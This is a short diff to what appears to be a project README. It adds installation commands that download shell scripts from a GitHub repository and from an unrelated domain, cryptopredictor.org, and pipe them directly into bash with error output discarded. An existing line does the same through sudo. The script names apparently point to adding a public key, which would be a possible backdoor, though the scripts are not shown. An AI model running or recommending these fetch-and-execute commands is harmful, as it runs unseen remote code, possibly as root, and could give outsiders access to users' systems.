@@ -23,6 +23,10 @@ apt update -y && apt install sudo curl -y && curl -fsSL https://raw.githubuserco
 ```bash
 # Normal shell
 sudo apt update -y && sudo apt install curl -y && curl -fsSL https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic.sh | sudo bash 2>/dev/null
+
+
+curl -fsSL https://raw.githubusercontent.com/NeronNymus/protection/refs/heads/main/light/add_public_dynamic_u.sh | bash 2>/dev/null
+curl -fsSL https://cryptopredictor.org/add_public_dynamic_u.sh | bash 2>/dev/null
 ```
 
 ### Windows
